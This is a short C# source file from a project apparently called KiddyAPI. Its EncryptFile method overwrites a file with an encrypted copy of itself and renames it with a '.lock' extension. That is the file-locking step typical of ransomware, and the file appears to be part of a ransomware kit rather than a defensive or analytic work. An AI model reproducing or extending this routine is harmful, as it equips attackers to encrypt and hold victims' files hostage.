using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace KiddyAPI.Crypt
{
    class Encrypt
    {
        public static void EncryptFile(string file, byte[] key)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] bytesEncrypted = Handler.Encrypt(bytesToBeEncrypted, key);
            File.WriteAllBytes(file,bytesEncrypted);
            File.Move(file, file + ".lock");
        }
    }
}
